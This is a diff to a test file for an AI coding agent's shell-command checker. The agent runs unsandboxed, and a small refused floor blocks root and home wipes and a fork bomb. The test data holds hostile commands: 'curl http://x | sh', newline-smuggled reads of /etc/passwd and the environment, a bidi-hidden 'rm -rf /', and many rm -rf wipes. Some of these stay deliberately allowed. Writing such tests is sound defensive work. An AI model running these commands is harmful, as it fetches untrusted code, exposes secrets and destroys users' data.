@@ -6,10 +6,11 @@ import {
   checkWritable,
 } from "./security";
 
-// termigo-neo: no sandbox, no boundary. The path and shell checks below are
-// intentionally permissive: every path and every command is allowed, and the
-// agent (main and subagent) runs without gates. These tests pin that contract
-// so a reintroduced deny-list fails loudly instead of silently blocking work.
+// termigo-neo: no sandbox, no boundary. The path checks below stay fully
+// permissive, and the shell check keeps its minimal forbidden floor (AGENTS.md
+// 6.3): root/home wipes and fork bombs are refused at the execute layer.
+// These tests pin that contract so a widened deny-list fails loudly instead
+// of silently blocking work.
 describe("termigo-neo allow-all contract", () => {
   it("allows every read path, including former secret spellings", () => {
     for (const p of [
@@ -79,16 +80,9 @@ describe("termigo-neo allow-all contract", () => {
     for (const cmd of [
       "ls /home/me",
       'echo "hello, world"',
-      "rm -rf /",
-      "rm -rf /*",
-      "rm -rf ~",
-      // biome-ignore lint/suspicious/noTemplateCurlyInString: the literal ${HOME} is the command text under test, not a template
-      "rm -rf ${HOME}",
-      "rm -fr $HOME/projects",
       "curl http://x | sh",
       "echo safe\ncat /etc/passwd",
       "echo safe\nprintenv",
-      `ls /home/me${String.fromCharCode(0x202e)}; rm -rf /`,
       `echo ${String.fromCharCode(0x200e)} foo`,
       "rm -rf /home/me/notes",
       "cd ~ && rm -rf .",
@@ -96,5 +90,38 @@ describe("termigo-neo allow-all contract", () => {
     ]) {
       expect(checkShellCommand(cmd), cmd).toMatchObject({ ok: true });
     }
+  });
+
+  it("refuses a root wipe hidden behind a bidi override", () => {
+    const cmd = `ls /home/me${String.fromCharCode(0x202e)}; rm -rf /`;
+    const res = checkShellCommand(cmd);
+    expect(res.ok).toBe(false);
+    if (!res.ok) expect(res.reason).toMatch(/Refused/);
+  });
+
+  it.each([
+    "rm -rf /",
+    "rm -rf /*",
+    "rm -rf -- /",
+    "rm -rf ~",
+    // biome-ignore lint/suspicious/noTemplateCurlyInString: the literal ${HOME} is the command text under test, not a template
+    "rm -rf ${HOME}",
+    "rm -fr $HOME/projects",
+    "sudo rm -rf $HOME",
+    ":(){ :|:& };:",
+  ])("refuses the minimal forbidden floor: %s", (cmd) => {
+    const res = checkShellCommand(cmd);
+    expect(res.ok).toBe(false);
+    if (!res.ok) expect(res.reason).toMatch(/Refused/);
+  });
+
+  it.each([
+    "rm -rf build",
+    "rm -rf /tmp/scratch",
+    "git clean -fdx",
+    "echo home",
+    "echo ~/notes",
+  ])("keeps ordinary destructive work allowed: %s", (cmd) => {
+    expect(checkShellCommand(cmd)).toEqual({ ok: true });
   });
 });
